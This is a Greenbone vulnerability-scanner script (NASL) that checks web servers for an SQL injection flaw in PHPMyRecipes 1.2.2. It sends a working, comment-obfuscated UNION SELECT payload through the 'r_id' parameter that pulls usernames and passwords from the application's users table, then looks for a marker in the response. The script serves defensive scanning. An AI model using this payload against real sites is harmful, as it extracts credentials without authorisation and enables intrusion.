# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903204");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-02-22 18:45:39 +0530 (Fri, 22 Feb 2013)");
  script_name("PHPMyRecipes SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/82243");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58094");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24537");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120425/phpMyRecipes-1.2.2-SQL-Injection.html");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation allows the attacker to compromise the
  application, access or modify data in the back-end database.");

  script_tag(name:"affected", value:"PHPMyRecipes version 1.2.2 and prior");

  script_tag(name:"insight", value:"Input passed via 'r_id' parameter in viewrecipe.php is not
  properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"PHPMyRecipes is prone to an SQL injection (SQLi) vulnerability.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)) exit(0);

vt_strings = get_vt_strings();

foreach dir (make_list_unique("/", "/phpMyRecipes", "/recipes", http_cgi_dirs(port:port))) {

  if(dir == "/") dir = "";

  res = http_get_cache(item:string(dir,"/index.php"),  port:port);

  if('>phpMyRecipes' >< res) {
    url = string(dir, "/recipes/viewrecipe.php?r_id=NULL/**/UNION/**/ALL/**",
                "/SELECT/**/CONCAT(username,0x3a,password,0x",vt_strings["default_hex"],
                ")GORONTALO,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/users");

    if(http_vuln_check(port:port, url:url, pattern:vt_strings["default"],
                       check_header:TRUE, extra_check:"findrecipe.php")) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
